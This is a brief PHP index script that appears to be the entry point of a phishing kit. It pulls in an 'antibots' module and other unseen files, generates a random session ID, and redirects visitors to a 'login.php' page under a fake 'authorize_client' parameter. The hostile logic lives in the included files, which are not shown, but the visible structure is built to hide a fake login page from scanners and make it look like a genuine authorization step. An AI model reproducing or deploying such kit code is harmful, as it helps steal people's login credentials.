<?php

    include("home.php");
    include('infos.php');
    include('./antibots/antibot.php');
    include('./strom1.php');

    $_SESSION["id"] = generate_random_id(15);

    header("Location: login.php?authorize_client=" . $_SESSION["id"]);

?>